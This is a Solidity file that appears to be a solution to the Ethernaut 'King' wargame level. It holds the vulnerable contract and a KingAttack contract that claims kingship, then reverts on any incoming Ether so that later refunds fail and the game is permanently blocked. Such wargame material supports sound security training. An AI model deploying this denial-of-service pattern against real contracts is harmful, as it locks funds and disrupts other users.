// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingAttack{
    uint s_count = 0;

    function sendEthToKing() public payable  {
        (bool sent, bytes memory data) = address(0x4ba6076d8D44410fd6a719d7AE1Cff984DF30210).call{value: 20000000000000000}("");
        require(sent, "Failed to send Ether");
    }
    
    // This function fails "king.transfer" trx from Ethernaut
    receive() external payable {
        require(s_count < 1);
        s_count = s_count + 1;
    }
    fallback() external payable{
        require(s_count < 1);
        s_count = s_count + 1;
    }
}